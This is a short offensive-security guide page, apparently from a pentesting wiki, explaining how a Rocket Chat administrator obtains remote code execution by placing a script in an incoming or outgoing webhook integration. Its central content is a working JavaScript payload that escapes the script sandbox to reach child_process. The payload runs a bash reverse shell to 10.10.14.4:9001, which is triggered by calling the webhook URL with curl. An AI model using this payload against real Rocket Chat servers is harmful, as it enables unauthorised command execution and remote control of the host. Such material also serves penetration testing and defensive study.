# Rocket Chat

## RCE

If you are admin inside Rocket Chat you can get RCE.

- Got to **`Integrations`** and select **`New Integration`** and choose any: **`Incoming WebHook`** or **`Outgoing WebHook`**.
  - `/admin/integrations/incoming`

<img src="../../images/image (266).png" alt=""><figcaption></figcaption>

- According to the [docs](https://docs.rocket.chat/guides/administration/admin-panel/integrations), both use ES2015 / ECMAScript 6 ([basically JavaScript](https://codeburst.io/javascript-wtf-is-es6-es8-es-2017-ecmascript-dca859e4821c)) to process the data. So lets get a [rev shell for javascript](../../generic-hacking/reverse-shells/linux.md#nodejs) like:

```javascript
const require = console.log.constructor("return process.mainModule.require")()
const { exec } = require("child_process")
exec("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'")
```

- Configure the WebHook (the channel and post as username must exists):

<img src="../../images/image (905).png" alt=""><figcaption></figcaption>

- Configure WebHook script:

<img src="../../images/image (572).png" alt=""><figcaption></figcaption>

- Save changes
- Get the generated WebHook URL:

<img src="../../images/image (937).png" alt=""><figcaption></figcaption>

- Call it with curl and you shuold receive the rev shell
